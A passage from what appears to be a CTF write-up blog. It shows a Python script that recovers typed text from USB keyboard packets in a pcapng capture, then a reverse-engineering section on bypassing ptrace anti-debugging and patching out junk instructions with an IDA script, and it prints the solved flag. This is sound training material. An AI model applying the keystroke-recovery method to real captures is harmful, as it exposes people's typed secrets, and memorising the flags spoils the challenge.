|</span></span><br><span class="line">    <span class="number">0x65</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Application</span></span><br><span class="line">    <span class="number">0x66</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Power</span></span><br><span class="line">    <span class="number">0x67</span>: (<span class="string">&#x27;[KEYPADEQUALS]&#x27;</span>, <span class="string">&#x27;=&#x27;</span>),              <span class="comment"># Keypad =</span></span><br><span class="line">    <span class="number">0x68</span>: (<span class="string">&#x27;[F13]&#x27;</span>, <span class="string">&#x27;[F13]&#x27;</span>),                   <span class="comment"># F13</span></span><br><span class="line">    <span class="number">0x69</span>: (<span class="string">&#x27;[F14]&#x27;</span>, <span class="string">&#x27;[F14]&#x27;</span>),                   <span class="comment"># F14</span></span><br><span class="line">    <span class="number">0x6a</span>: (<span class="string">&#x27;[F15]&#x27;</span>, <span class="string">&#x27;[F15]&#x27;</span>),                   <span class="comment"># F15</span></span><br><span class="line">    <span class="number">0x6b</span>: (<span class="string">&#x27;[F16]&#x27;</span>, <span class="string">&#x27;[F16]&#x27;</span>),                   <span class="comment"># F16</span></span><br><span class="line">    <span class="number">0x6c</span>: (<span class="string">&#x27;[F17]&#x27;</span>, <span class="string">&#x27;[F17]&#x27;</span>),                   <span class="comment"># F17</span></span><br><span class="line">    <span class="number">0x6d</span>: (<span class="string">&#x27;[F18]&#x27;</span>, <span class="string">&#x27;[F18]&#x27;</span>),                   <span class="comment"># F18</span></span><br><span class="line">    <span class="number">0x6e</span>: (<span class="string">&#x27;[F19]&#x27;</span>, <span class="string">&#x27;[F19]&#x27;</span>),                   <span class="comment"># F19</span></span><br><span class="line">    <span class="number">0x6f</span>: (<span class="string">&#x27;[F20]&#x27;</span>, <span class="string">&#x27;[F20]&#x27;</span>),                   <span class="comment"># F20</span></span><br><span class="line">    <span class="number">0x70</span>: (<span class="string">&#x27;[F21]&#x27;</span>, <span class="string">&#x27;[F21]&#x27;</span>),                   <span class="comment"># F21</span></span><br><span class="line">    <span class="number">0x71</span>: (<span class="string">&#x27;[F22]&#x27;</span>, <span class="string">&#x27;[F22]&#x27;</span>),                   <span class="comment"># F22</span></span><br><span class="line">    <span class="number">0x72</span>: (<span class="string">&#x27;[F23]&#x27;</span>, <span class="string">&#x27;[F23]&#x27;</span>),                   <span class="comment"># F23</span></span><br><span class="line">    <span class="number">0x73</span>: (<span class="string">&#x27;[F24]&#x27;</span>, <span class="string">&#x27;[F24]&#x27;</span>),                   <span class="comment"># F24</span></span><br><span class="line">    <span class="number">0x74</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Execute</span></span><br><span class="line">    <span class="number">0x75</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Help</span></span><br><span class="line">    <span class="number">0x76</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Menu</span></span><br><span class="line">    <span class="number">0x77</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Select</span></span><br><span class="line">    <span class="number">0x78</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Stop</span></span><br><span class="line">    <span class="number">0x79</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Again</span></span><br><span class="line">    <span class="number">0x7a</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Undo</span></span><br><span class="line">    <span class="number">0x7b</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Cut</span></span><br><span class="line">    <span class="number">0x7c</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Copy</span></span><br><span class="line">    <span class="number">0x7d</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Paste</span></span><br><span class="line">    <span class="number">0x7e</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Find</span></span><br><span class="line">    <span class="number">0x7f</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Mute</span></span><br><span class="line">    <span class="number">0x80</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Volume Up</span></span><br><span class="line">    <span class="number">0x81</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Volume Down</span></span><br><span class="line">    <span class="number">0x82</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Locking Caps Lock</span></span><br><span class="line">    <span class="number">0x83</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Locking Num Lock</span></span><br><span class="line">    <span class="number">0x84</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Locking Scroll Lock</span></span><br><span class="line">    <span class="number">0x85</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Comma</span></span><br><span class="line">    <span class="number">0x86</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Equal Sign</span></span><br><span class="line">    <span class="number">0x87</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International1</span></span><br><span class="line">    <span class="number">0x88</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International2</span></span><br><span class="line">    <span class="number">0x89</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International3</span></span><br><span class="line">    <span class="number">0x8a</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International4</span></span><br><span class="line">    <span class="number">0x8b</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International5</span></span><br><span class="line">    <span class="number">0x8c</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International6</span></span><br><span class="line">    <span class="number">0x8d</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International7</span></span><br><span class="line">    <span class="number">0x8e</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International8</span></span><br><span class="line">    <span class="number">0x8f</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># International9</span></span><br><span class="line">    <span class="number">0x90</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG1</span></span><br><span class="line">    <span class="number">0x91</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG2</span></span><br><span class="line">    <span class="number">0x92</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG3</span></span><br><span class="line">    <span class="number">0x93</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG4</span></span><br><span class="line">    <span class="number">0x94</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG5</span></span><br><span class="line">    <span class="number">0x95</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG6</span></span><br><span class="line">    <span class="number">0x96</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG7</span></span><br><span class="line">    <span class="number">0x97</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG8</span></span><br><span class="line">    <span class="number">0x98</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># LANG9</span></span><br><span class="line">    <span class="number">0x99</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Alternate Erase</span></span><br><span class="line">    <span class="number">0x9a</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># SysReq/Attention</span></span><br><span class="line">    <span class="number">0x9b</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Cancel</span></span><br><span class="line">    <span class="number">0x9c</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Clear</span></span><br><span class="line">    <span class="number">0x9d</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Prior</span></span><br><span class="line">    <span class="number">0x9e</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Return</span></span><br><span class="line">    <span class="number">0x9f</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Separator</span></span><br><span class="line">    <span class="number">0xa0</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Out</span></span><br><span class="line">    <span class="number">0xa1</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Oper</span></span><br><span class="line">    <span class="number">0xa2</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Clear/Again</span></span><br><span class="line">    <span class="number">0xa3</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># CrSel/Props</span></span><br><span class="line">    <span class="number">0xa4</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># ExSel</span></span><br><span class="line">    <span class="number">0xa5</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xa6</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xa7</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xa8</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xa9</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xaa</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xab</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xac</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xad</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xae</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xaf</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xb0</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad 00</span></span><br><span class="line">    <span class="number">0xb1</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad 000</span></span><br><span class="line">    <span class="number">0xb2</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Thousands Separator</span></span><br><span class="line">    <span class="number">0xb3</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Decimal Separator</span></span><br><span class="line">    <span class="number">0xb4</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Currency Unit</span></span><br><span class="line">    <span class="number">0xb5</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Currency Sub-unit</span></span><br><span class="line">    <span class="number">0xb6</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad (</span></span><br><span class="line">    <span class="number">0xb7</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad )</span></span><br><span class="line">    <span class="number">0xb8</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &#123;</span></span><br><span class="line">    <span class="number">0xb9</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &#125;</span></span><br><span class="line">    <span class="number">0xba</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Tab</span></span><br><span class="line">    <span class="number">0xbb</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Backspace</span></span><br><span class="line">    <span class="number">0xbc</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad A</span></span><br><span class="line">    <span class="number">0xbd</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad B</span></span><br><span class="line">    <span class="number">0xbe</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad C</span></span><br><span class="line">    <span class="number">0xbf</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad D</span></span><br><span class="line">    <span class="number">0xc0</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad E</span></span><br><span class="line">    <span class="number">0xc1</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad F</span></span><br><span class="line">    <span class="number">0xc2</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad XOR</span></span><br><span class="line">    <span class="number">0xc3</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad ^</span></span><br><span class="line">    <span class="number">0xc4</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad %</span></span><br><span class="line">    <span class="number">0xc5</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &lt;</span></span><br><span class="line">    <span class="number">0xc6</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &gt;</span></span><br><span class="line">    <span class="number">0xc7</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &amp;</span></span><br><span class="line">    <span class="number">0xc8</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad &amp;&amp;</span></span><br><span class="line">    <span class="number">0xc9</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad |</span></span><br><span class="line">    <span class="number">0xca</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad ||</span></span><br><span class="line">    <span class="number">0xcb</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad :</span></span><br><span class="line">    <span class="number">0xcc</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad #</span></span><br><span class="line">    <span class="number">0xcd</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Space</span></span><br><span class="line">    <span class="number">0xce</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad @</span></span><br><span class="line">    <span class="number">0xcf</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad !</span></span><br><span class="line">    <span class="number">0xd0</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Store</span></span><br><span class="line">    <span class="number">0xd1</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Recall</span></span><br><span class="line">    <span class="number">0xd2</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Clear</span></span><br><span class="line">    <span class="number">0xd3</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Add</span></span><br><span class="line">    <span class="number">0xd4</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Subtract</span></span><br><span class="line">    <span class="number">0xd5</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Multiply</span></span><br><span class="line">    <span class="number">0xd6</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Memory Divide</span></span><br><span class="line">    <span class="number">0xd7</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad +/-</span></span><br><span class="line">    <span class="number">0xd8</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Clear</span></span><br><span class="line">    <span class="number">0xd9</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Clear Entry</span></span><br><span class="line">    <span class="number">0xda</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Binary</span></span><br><span class="line">    <span class="number">0xdb</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Octal</span></span><br><span class="line">    <span class="number">0xdc</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Decimal</span></span><br><span class="line">    <span class="number">0xdd</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Keypad Hexadecimal</span></span><br><span class="line">    <span class="number">0xde</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xdf</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Reserved</span></span><br><span class="line">    <span class="number">0xe0</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Left Control</span></span><br><span class="line">    <span class="number">0xe1</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Left Shift</span></span><br><span class="line">    <span class="number">0xe2</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Left Alt</span></span><br><span class="line">    <span class="number">0xe3</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Left GUI</span></span><br><span class="line">    <span class="number">0xe4</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Right Control</span></span><br><span class="line">    <span class="number">0xe5</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Right Shift</span></span><br><span class="line">    <span class="number">0xe6</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Right Alt</span></span><br><span class="line">    <span class="number">0xe7</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Right GUI</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CAPSLOCK = <span class="literal">False</span> <span class="comment"># 大写状态</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_boot_keyboard_report</span>(<span class="params">data: <span class="built_in">bytearray</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CAPSLOCK</span><br><span class="line">    <span class="comment"># 数据解析</span></span><br><span class="line">    modifiers = data[<span class="number">0</span>] <span class="comment"># 修改键字节</span></span><br><span class="line">    keys = data[<span class="number">2</span>:<span class="number">8</span>] <span class="comment"># 键码字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将修改键字节中的位解码为按键修饰符</span></span><br><span class="line">    ctrl = (modifiers &amp; <span class="number">0x11</span>) != <span class="number">0</span></span><br><span class="line">    shift = (modifiers &amp; <span class="number">0x22</span>) != <span class="number">0</span></span><br><span class="line">    alt = (modifiers &amp; <span class="number">0x44</span>) != <span class="number">0</span></span><br><span class="line">    gui = (modifiers &amp; <span class="number">0x88</span>) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析键码字节并将其映射为字符</span></span><br><span class="line">    characters = []</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">if</span> key != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 键码不为0则查询映射表</span></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> BOOT_KEYBOARD_MAP:</span><br><span class="line">                <span class="keyword">if</span> key &gt;= <span class="number">0x04</span> <span class="keyword">and</span> key &lt;= <span class="number">0x1d</span>: <span class="comment"># 是字母</span></span><br><span class="line">                    characters.append(BOOT_KEYBOARD_MAP[key][CAPSLOCK ^ shift])</span><br><span class="line">                <span class="keyword">elif</span> key == <span class="number">0x39</span>:</span><br><span class="line">                    CAPSLOCK = <span class="keyword">not</span> CAPSLOCK</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    characters.append(BOOT_KEYBOARD_MAP[key][shift])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                characters.append(<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> (ctrl, shift, alt, gui, characters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help_formatter</span>(<span class="params">prog</span>):</span><br><span class="line">    <span class="keyword">return</span> argparse.HelpFormatter(prog, max_help_position=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 解析命令行参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">      description=<span class="string">&#x27;Parse keyboard report data and output as text&#x27;</span>,</span><br><span class="line">      formatter_class=help_formatter)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;pcapng_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;path to the pcapng file&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    tmpfile = NamedTemporaryFile(delete=<span class="literal">False</span>)</span><br><span class="line">    tmpfile.close()</span><br><span class="line"></span><br><span class="line">    command = <span class="string">&quot;tshark -r %s -T fields -e usbhid.data -e usb.capdata &gt; %s&quot;</span> % </span><br><span class="line">      (args.pcapng_file, tmpfile.name)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(tmpfile.name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">    os.unlink(tmpfile.name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析键盘数据包，获取输入字符</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    last_characters_count = &#123;&#125;</span><br><span class="line">    repeat_limit = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        capdata = line.strip().replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> capdata:</span><br><span class="line">            data = <span class="built_in">bytearray</span>.fromhex(capdata)</span><br><span class="line">            characters = parse_boot_keyboard_report(data)[-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> characters:</span><br><span class="line">                last_characters_count = &#123;&#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> character <span class="keyword">in</span> characters:</span><br><span class="line">                    <span class="keyword">if</span> character:</span><br><span class="line">                        last_characters_count = &#123;character: count <span class="keyword">for</span> character,</span><br><span class="line">                                                count <span class="keyword">in</span> last_characters_count.items() <span class="keyword">if</span> character <span class="keyword">in</span> characters&#125;</span><br><span class="line">                        <span class="keyword">if</span> character <span class="keyword">in</span> last_characters_count:</span><br><span class="line">                            last_characters_count[character] += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> last_characters_count[character] &lt;= repeat_limit:</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            last_characters_count[character] = <span class="number">1</span></span><br><span class="line">                        text += character</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    raw_text = <span class="built_in">repr</span>(text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Raw output:\n<span class="subst">&#123;raw_text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Text output:\n<span class="subst">&#123;text&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到 <code>Ao(mgHY$\A@Q7gW2D$dE@6#oO0f&lt;Gm1hAI'/N#4&lt;AN;MS@PfrQ149K</code></p><p>扔到 CyberChef 里发现是 Base85，解出 flag</p><p><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><h2 id="REVERSE">REVERSE</h2><h3 id="Animals">Animals</h3><p>ida 无法直接反编译，发现存在花指令，以及 ptrace 反调试</p><p>直接 gdb 里 catch syscall ptrace，然后在快 ret 的时候，set $rax=0 即可绕过 ptrace</p><p>然后混淆主要由两种花指令构成：</p><ul><li><code>jz</code>、<code>jnz</code> 组合跳转 + 垃圾代码中使用 call 来打乱 ida 分析</li><li><code>jnz</code>、<code>jmp</code> 组合，<code>jnz</code> 永真跳转</li></ul><p>把这两种指令修了，该 nop 的 nop 掉：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start_add = <span class="number">0x400800</span></span><br><span class="line">end_add = <span class="number">0x406e22</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_add, end_add):</span><br><span class="line">    <span class="keyword">if</span> get_wide_dword(i) == <span class="number">0x08750a74</span>:</span><br><span class="line">        patch_dword(i, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">4</span>, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">8</span>, <span class="number">0x90909090</span>)</span><br><span class="line">    <span class="keyword">elif</span> get_wide_dword(i) == <span class="number">0x13751574</span>:</span><br><span class="line">        patch_dword(i, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">4</span>, <span 